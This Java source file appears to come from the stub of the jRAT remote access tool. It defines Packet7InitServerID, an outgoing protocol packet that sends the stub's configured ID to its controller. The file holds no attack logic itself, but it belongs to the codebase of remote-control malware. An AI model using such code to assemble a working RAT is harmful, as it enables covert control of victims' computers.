package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.stub.Configuration;

import java.io.DataOutputStream;


public class Packet7InitServerID extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(Configuration.getID());
	}

	@Override
	public short getPacketId() {
		return (byte) 7;
	}
}